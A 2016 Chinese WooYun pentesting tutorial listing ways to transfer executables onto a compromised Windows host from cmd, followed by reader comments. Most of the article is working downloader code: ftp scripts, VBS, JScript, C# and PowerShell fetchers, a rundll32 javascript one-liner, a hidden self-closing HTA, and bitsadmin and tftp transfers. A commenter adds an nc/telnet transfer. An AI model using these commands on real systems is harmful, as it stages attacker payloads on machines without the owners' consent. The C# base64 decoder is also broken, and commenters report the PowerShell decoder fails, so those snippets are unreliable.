@@ -1,0 +1,173 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">渗透技巧——通过cmd上传文件的N种方法</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">三好学生</a> <span class="bull">·</span> <time title="2016/04/05 10:23" ui-time="" datetime="2016/04/05 10:23" class="published ng-binding ng-isolate-scope">2016/04/05 10:23</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>在渗透测试的过程中，常常需要向目标主机上传文件，我在最近的学习测试过程中就碰到了这个问题，要求只能通过cmd shell向目标主机（Windows系统）上传文件，所以本文就对该技巧做一下总结。</p><p><img alt="Alt text" img-src="80c71422183f7965ab1f5ba431efc6a106d76f2d.jpg"></p><blockquote><p>图片来自于<a href="http://www.telegraph.co.uk/news/worldnews/northamerica/usa/11754089/Hacker-remotely-crashes-Jeep-from-10-miles-away.html">http://www.telegraph.co.uk/news/worldnews/northamerica/usa/11754089/Hacker-remotely-crashes-Jeep-from-10-miles-away.html</a></p></blockquote><h1>0x02 测试环境</h1><hr><pre><code>OS：Win7 x86
+test exe：ssss2.exe,成功运行后输出1
+</code></pre><h1>0x03 通用上传方法</h1><hr><h3>1、 debug</h3><p>debug是一个程序调试工具，功能包括：</p><ul><li>直接输入，更改，跟踪，运行汇编语言源程序</li><li>观察操作系统的内容</li><li>查看ROM BIOS的内容</li><li>观察更改RAM内部的设置值</li><li>以扇区或文件的方式读写软盘数据</li></ul><p>特别的是它还有一个功能可以将十六进制代码转换为可执行文件：</p><p><img alt="Alt text" img-src="7b51e1a6accdaddaedca6e8742d122e7de1df904.jpg"></p><p>结合本文的目标，思路如下：</p><ol><li>把需要上传的exe转换成十六进制hex的形式</li><li>通过echo命令将hex代码写入文件</li><li>使用debug功能将hex代码还原出exe文件</li></ol><p><strong>实际测试：</strong></p><p>kali中的exe2bat.exe提供了这个功能，位于<code>/usr/share/windows-binaries</code></p><p>如图</p><p><img alt="Alt text" img-src="13d0068d8b0f88a8b0cf8ecec82c14101ae40efc.jpg"></p><p><strong>操作步骤：</strong></p><p>kali：</p><pre><code>#!bash
+cd /usr/share/windows-binaries
+wine exe2bat.exe ssss2.exe ssss2.txt
+</code></pre><p>执行后会生成ssss2.txt，将里面的内容复制粘贴到cmd命令行下依次执行</p><p>执行后会生成1.dll、123.hex、ssss.exe</p><p>如图</p><p><img alt="Alt text" img-src="490f1330a6b3e55c15c8ef5641956571302ec907.jpg"></p><p><strong>注：</strong><br>exe2bat不支持大于64kb的文件 debug默认只支持在32位系统</p><p>如图</p><p><img alt="Alt text" img-src="362c5463ba32f0054df197c4f7259490d88e44f6.jpg"></p><h3>2、ftp</h3><p>搭建好ftp服务器：</p><pre><code>ip:192.168.174.151
+文件:ssss2.exe
+</code></pre><p>按顺序执行如下代码即可通过ftp来下载文件</p><p>cmd：</p><pre><code>#!bash
+echo open 192.168.174.151 21&gt; ftp.txt
+echo ftp&gt;&gt; ftp.txt
+echo bin &gt;&gt; ftp.txt
+echo ftp&gt;&gt; ftp.txt
+echo GET ssss2.exe &gt;&gt; ftp.txt
+ftp -s:ftp.txt
+</code></pre><p>如图</p><p><img alt="Alt text" img-src="630a274fc00ac3f6faa78034d560226e7ed06d7f.jpg"></p><p><strong>注：</strong><br>初次使用ftp下载防火墙会弹框拦截，使用前记得要先添加防火墙规则</p><h3>3、vbs</h3><p>vbs downloader,使用msxml2.xmlhttp和adodb.stream对象</p><p>如下代码保存为.vbs文件：</p><pre><code>#!vb
+Set Post = CreateObject("Msxml2.XMLHTTP")
+Set Shell = CreateObject("Wscript.Shell")
+Post.Open "GET","http://192.168.174.145/ssss2.exe",0
+Post.Send()
+Set aGet = CreateObject("ADODB.Stream")
+aGet.Mode = 3
+aGet.Type = 1
+aGet.Open()
+aGet.Write(Post.responseBody)
+aGet.SaveToFile "C:\test\update\ssss2.exe",2
+</code></pre><p>对应到cmd下的命令为：</p><pre><code>#!bash
+echo Set Post = CreateObject("Msxml2.XMLHTTP") &gt;&gt;download.vbs
+echo Set Shell = CreateObject("Wscript.Shell") &gt;&gt;download.vbs
+echo Post.Open "GET","http://192.168.174.145/ssss2.exe",0 &gt;&gt;download.vbs
+echo Post.Send() &gt;&gt;download.vbs
+echo Set aGet = CreateObject("ADODB.Stream") &gt;&gt;download.vbs
+echo aGet.Mode = 3 &gt;&gt;download.vbs
+echo aGet.Type = 1 &gt;&gt;download.vbs
+echo aGet.Open() &gt;&gt;download.vbs
+echo aGet.Write(Post.responseBody) &gt;&gt;download.vbs
+echo aGet.SaveToFile "C:\test\update\ssss2.exe",2 &gt;&gt;download.vbs
+</code></pre><p>按顺序依次执行后会生成download.vbs，然后执行download.vbs即可实现下载ssss2.exe</p><h3>4、powershell</h3><p>cmd：</p><pre><code>#!powershell
+powershell (new-object System.Net.WebClient).DownloadFile( 'http://192.168.174.145/ssss2.exe','C:\test\update\ssss2.exe')
+</code></pre><h3>5、csc</h3><p>csc.exe是微软.NET Framework 中的C#编译器，Windows系统中默认包含，可在命令行下将cs文件编译成exe</p><p>c# downloader的代码为：</p><pre><code>#!csharp
+using System.Net;
+namespace downloader
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            WebClient client = new WebClient();
+            string URLAddress = @"http://192.168.174.145/ssss2.exe";
+            string receivePath = @"C:\test\update\";
+            client.DownloadFile(URLAddress, receivePath + System.IO.Path.GetFileName
+        (URLAddress));
+        }
+    }
+}
+</code></pre><p>使用echo将代码依次写入文件download.cs中，然后调用csc.exe编译cs文件</p><p>执行</p><pre><code>#!bash
+C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:C:\tes
+t\update\download.exe C:\test\update\download.cs
+</code></pre><p>如图成功生成download.exe</p><p><img alt="Alt text" img-src="89f9378f1e879557a6b75e8ae69572a40b337528.jpg"></p><p><strong>注：</strong><br>csc.exe的绝对路径要根据系统的.net版本来确定</p><h3>6、JScript</h3><p>相比于JSRat中用的<code>Scripting.FileSystemObject</code></p><p>换用<code>ADODB.Stream</code>实现起来更加简单高效</p><p>以下代码依次保存为js文件，直接执行即可实现下载文件</p><pre><code>#!js
+var Object = WScript.CreateObject("MSXML2.XMLHTTP");
+Object.open("GET","http://192.168.174.145/ssss2.exe",false);
+Object.send();
+if (Object.Status == 200)
+{
+    var Stream = WScript.CreateObject("ADODB.Stream");
+    Stream.Open();
+    Stream.Type = 1;
+    Stream.Write(Object.ResponseBody);
+    Stream.SaveToFile("C:\\test\\update\\ssss2.exe", 2);
+    Stream.Close();
+}
+</code></pre><p>合并成rundll32的一句话（类似于JSRat的启动方式）：</p><p>cmd：</p><pre><code>#!bash
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();Object=new%20ActiveXObject("Microsoft.XMLHTTP");Object.open("GET","http://192.168.174.145/ssss2.exe",false);Object.send();if(Object.Status==200){Stream=new%20ActiveXObject("ADODB.Stream");Stream.Open();Stream.Type=1;Stream.Write(Object.ResponseBody);Stream.SaveToFile("C:\\test\\update\\ssss2.exe",2);Stream.Close();}
+</code></pre><p>执行后会提示没有权限，很有趣的地方，更多的细节会在以后的文章介绍</p><p><img alt="Alt text" img-src="a4704b23377475130c52fac6f1af8e052418d31a.jpg"></p><p><img alt="Alt text" img-src="99676797191deaf0795dae3be783fe148a65af5f.jpg"></p><h3>7、hta</h3><p>添加最小化和自动退出hta程序的功能，执行过程中会最小化hta窗口，下载文件结束后自动退出hta程序</p><p>以下代码保存为.hta文件：</p><pre><code>#!js
+&lt;html&gt;
+&lt;head&gt;
+&lt;script&gt;
+var Object = new ActiveXObject("MSXML2.XMLHTTP");
+Object.open("GET","http://192.168.174.145/ssss2.exe",false);
+Object.send();
+if (Object.Status == 200)
+{
+    var Stream = new ActiveXObject("ADODB.Stream");
+    Stream.Open();
+    Stream.Type = 1;
+    Stream.Write(Object.ResponseBody);
+    Stream.SaveToFile("C:\\test\\update\\ssss2.exe", 2);
+    Stream.Close();
+}
+window.close();
+&lt;/script&gt;
+&lt;HTA:APPLICATION ID="test"
+WINDOWSTATE = "minimize"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;  
+&lt;/html&gt;
+</code></pre><h3>8、bitsadmin</h3><p>bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。xp以后的Windows系统自带</p><p>使用方法：</p><p>cmd下：</p><pre><code>#!bash
+bitsadmin /transfer n http://download.sysinternals.com/files/PSTools.zip  C:\test\update\PSTools.zip 
+</code></pre><p>下载成功如图：</p><p><img alt="Alt text" img-src="db8cea4b74c414e87cc7e6a8a994d9295d29e2d1.jpg"></p><p><strong>注：</strong><br>不支持https、ftp协议<br>使用kali的simplehttpserver作服务器会报错</p><h3>9、base64</h3><p>将exe先作base64加密，通过cmd上传后解密输出 对exe作base64加密的方法：</p><p>（1）powershell</p><pre><code>$PEBytes = [System.IO.File]::ReadAllBytes("C:\windows\system32\calc.exe")
+$Base64Payload = [System.Convert]::ToBase64String($PEBytes)
+Set-Content base64.txt -Value $Base64Payload
+</code></pre><p>运行后会将C:\windows\system32\calc.exe作base64加密并输出到base64.txt</p><p>（2）c#</p><pre><code>using System;
+using System.IO;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace test1
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            byte[] AsBytes = File.ReadAllBytes(@"C:\windows\system32\calc.exe");
+            String AsBase64String = Convert.ToBase64String(AsBytes);
+            StreamWriter sw = new StreamWriter(@"C:\test\base64.txt");
+            sw.Write(AsBase64String);
+            sw.Close();
+        }
+    }
+}
+</code></pre><p>(3)eml附件</p><p>（思路由猪猪侠提供）</p><p>server2003 默认包含outlook客户端C:\Program Files\Outlook Express</p><p>运行后-新建邮件-上传附件-另存为eml格式</p><p>使用notepad打开eml邮件，可看到加密的base64代码</p><p>如图</p><p><img alt="enter image description here" img-src="e44d60f7ba9e1877547cc7f93acafa5c066bdaea.jpg"></p><p>解密base64文件并生成exe的方法：</p><p>（1）powershell</p><pre><code>$Base64Bytes = Get-Content (base64.txt)
+$PEBytes= [System.Convert]::FromBase64String($Base64Bytes)
+Set-Content calc.exe -Value $PEBytes
+</code></pre><p>（2）c#</p><pre><code>using System;
+using System.IO;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace test1
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            byte[] AsBytes = File.ReadAllBytes(@"C:\test\base64.txt");
+            String AsBase64String = Convert.FromBase64String(AsBytes);
+            StreamWriter sw = new StreamWriter(@"C:\test\calc.exe");
+            sw.Write(AsBase64String);
+            sw.Close();
+        }
+    }
+}
+</code></pre><p><strong>注：</strong> 读文件的操作可替换为base64代码直接写入脚本文件中</p><h1>0x04 补充上传方法</h1><hr><p>以上均为系统默认包含的程序，结合以上方法并借助于第三方工具也能够实现功能</p><p>这里介绍的思路是可先通过bitsadmin来下载第三方工具，然后利用第三方工具进行传输文件</p><h3>1、wget：</h3><pre><code>#!bash
+bitsadmin /transfer n http://www.interlog.com/~tcharron/wgetwin-1_5_3_1-binary.zip  C:\test\update\wget.zip
+</code></pre><p>运行后会下载wget的压缩包wget.zip</p><p><strong>注：</strong><br>Windows系统默认不包含解压缩zip文件的命令，但是可以通过vbs来实现解压缩zip文件</p><p><strong>vbs实现解压缩：</strong></p><p>以下代码保存为.vbs文件：</p><pre><code>#!vb
+UnZip "C:\test\update\wget.zip","C:\test\update\wget\"
+Sub UnZip(ByVal myZipFile, ByVal myTargetDir)
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    If NOT fso.FileExists(myZipFile) Then
+        Exit Sub
+    ElseIf fso.GetExtensionName(myZipFile) &lt;&gt; "zip" Then
+        Exit Sub
+    ElseIf NOT fso.FolderExists(myTargetDir) Then
+        fso.CreateFolder(myTargetDir)
+    End If
+    Set objShell = CreateObject("Shell.Application")
+    Set objSource = objShell.NameSpace(myZipFile)
+    Set objFolderItem = objSource.Items()
+    Set objTarget = objShell.NameSpace(myTargetDir)
+    intOptions = 256
+    objTarget.CopyHere objFolderItem, intOptions
+End Sub
+</code></pre><blockquote><p>代码来自于<a href="http://demon.tw/programming/vbs-unzip-file.html">http://demon.tw/programming/vbs-unzip-file.html</a></p></blockquote><p>成功解压缩后就可通过wget.exe来传输文件</p><pre><code>#!bash
+C:\test\update\wget\wget.exe http://192.168.174.145/ssss2.exe
+</code></pre><p>如图</p><p><img alt="Alt text" img-src="1dfc7e27c22dffa1d4ca5334d24116866764e7d5.jpg"></p><h3>2、ftfp</h3><p>思路同上，先通过bitsadmin下载tftp.exe，然后利用tftp传输文件</p><pre><code>#!bash
+bitsadmin /transfer n http://www.winagents.com/downloads/tftp.exe C:\test\update\tftp.exe
+</code></pre><p>下载成功后利用tftp传输文件：</p><pre><code>#!bash
+tftp -i 192.168.174.151 GET tftp\ssss2.exe C:\test\update\ssss2.exe
+</code></pre><p><strong>注：</strong><br>默认防火墙会拦截</p><p>关掉防火墙或者添加规则即可</p><p>如图</p><p><img alt="Alt text" img-src="289eac29410c9212e1d8e9a0ceb3c70b9b01a479.jpg"></p><h1>0x05 小结</h1><hr><p>本文对一些常用的通过cmd来传输文件的技巧做了整理，侧重于介绍其中较为通用简便的方法，所以并未介绍其他需要配置开发环境的实现方法，如Python、Ruby、Php等，如果你有更好的实现方法，欢迎与我交流，共同学习。</p><h1>0x06 参考资料</h1><hr><ul><li><a href="http://ly0n.me/2015/10/21/uploading-files-to-compromised-systems/">http://ly0n.me/2015/10/21/uploading-files-to-compromised-systems/</a></li><li><a href="https://blog.netspi.com/15-ways-to-download-a-file/">https://blog.netspi.com/15-ways-to-download-a-file/</a></li><li><a href="http://demon.tw/programming/vbs-download-file.html">http://demon.tw/programming/vbs-download-file.html</a></li><li><a href="http://demon.tw/programming/vbs-unzip-file.html">http://demon.tw/programming/vbs-unzip-file.html</a></li></ul><p><strong>本文由三好学生原创并首发于乌云drops，转载请注明</strong></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">whynot</span> <span class="reply-time">2016-05-04 17:12:45</span></div><p></p><p>姿势竟然这么多。。学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小白兔</span> <span class="reply-time">2016-04-28 08:05:32</span></div><p></p><p>刚才那个debug问题看到答案了，请大神自动忽略。<br>能不能比较一下各种方案的优缺点还有传输速率这一块呢？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小白兔</span> <span class="reply-time">2016-04-23 10:19:40</span></div><p></p><p>先膜拜大神<br>PS:debug.exe这个程序不是系统自带的吧？我没有找到呢</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">MillionSky</span> <span class="reply-time">2016-04-13 16:18:05</span></div><p></p><p>Base64-Powershell的解码有问题，生成的起始是exe每个字节的十进制字符串</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2016-04-12 23:13:57</span></div><p></p><p>http://www.2cto.com/Article/201305/209920.html 这个也很好玩的 大神。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">无敌情痴</span> <span class="reply-time">2016-04-09 21:59:48</span></div><p></p><p>膜拜大神</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2016-04-07 11:43:40</span></div><p></p><p>@猪猪侠 @数据流 内容已做补充更正~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Weiy、</span> <span class="reply-time">2016-04-06 17:10:26</span></div><p></p><p>好文章、可是Debug、我放弃了和bitsadmin 感觉利用价值不高！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Tr4c3</span> <span class="reply-time">2016-04-06 05:39:31</span></div><p></p><p>总结的不错。<br>不过debug这条基本可以放弃，zzzevazzz大牛说过：“写文件用ADODB.Recordset，比debug好使多了。”</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">K4r1iNNg</span> <span class="reply-time">2016-04-06 02:45:49</span></div><p></p><p>有个很像的 方法， 以前见过有个vbs能把exe转bat</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Her0in</span> <span class="reply-time">2016-04-05 22:42:29</span></div><p></p><p>只要有了cmd shell， 写一个批处理文件就可以搞定上传下载和隐藏执行了，苛刻的条件下完全没必要借助任何其他的exe，搞不好就被秒。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">L3m0n</span> <span class="reply-time">2016-04-05 22:15:21</span></div><p></p><p>刚刚想到如果那个debug的文件内容用鼠标的宏去存储，然后一键跑起....一个一个的手输真的很麻烦。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">落落</span> <span class="reply-time">2016-04-05 15:52:28</span></div><p></p><p>之前研究过 得到的结论是 ftp 最稳定 其次是vbs的base64转exe（补充下）|| wget vbs 其他的根据系统版本问题 各种不稳定</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">刘海哥</span> <span class="reply-time">2016-04-05 14:01:39</span></div><p></p><p>我记得我前段时间在测试csc老是因为权限的问题编译不出来。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">IzualYang</span> <span class="reply-time">2016-04-05 13:49:59</span></div><p></p><p>以前不是总结过么<br>http://drops.wooyun.org/tips/2420</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">L3m0n</span> <span class="reply-time">2016-04-05 13:19:24</span></div><p></p><p>学习了，比如编译型的，https://github.com/samratashok/nishang/blob/master/Utility/ExetoText.ps1<br>使用telnet，<br>服务端：nc -lvp 23 &lt; nc.exe<br>下载端：telnet ip -f c:\nc.exe<br>http://drops.wooyun.org/tips/783<br>最后膜拜一下师傅，=。=，可以给一个qq号联系方式么，</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">苦咖啡</span> <span class="reply-time">2016-04-05 13:14:35</span></div><p></p><p>学习了 好知识</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">数据流</span> <span class="reply-time">2016-04-05 12:36:33</span></div><p></p><p>Debug.exe只能在32位下的系统,64位是没有这个命令的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">bigx</span> <span class="reply-time">2016-04-05 12:34:24</span></div><p></p><p>学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">花尽无花</span> <span class="weibo"></span> <span class="reply-time">2016-04-05 12:31:46</span></div><p></p><p>JS/TrojanDownloader.Psyme.NEV 特洛伊木马，真是醉了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lxj616</span> <span class="reply-time">2016-04-05 12:31:20</span></div><p></p><p>@猪猪侠 这个思路真是diao</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Elliot-Su</span> <span class="weibo"></span> <span class="reply-time">2016-04-05 12:26:07</span></div><p></p><p>Mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">猪猪侠</span> <span class="reply-time">2016-04-05 12:12:49</span></div><p></p><p>还有一个路子，邮件草稿另存为EML，Base64，还原里面附带的附件</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">珈蓝夜宇</span> <span class="reply-time">2016-04-05 10:38:15</span></div><p></p><p>这篇文章写的太棒了，为什么没有打赏。。。</p><p>感谢楼主。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">0hey_boy0</span> <span class="reply-time">2016-04-05 10:36:24</span></div><p></p><p>都是好思路，学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">king7</span> <span class="reply-time">2016-04-05 10:33:58</span></div><p></p><p>干货，开眼了</p><p></p></div></div></div></div></div></main>
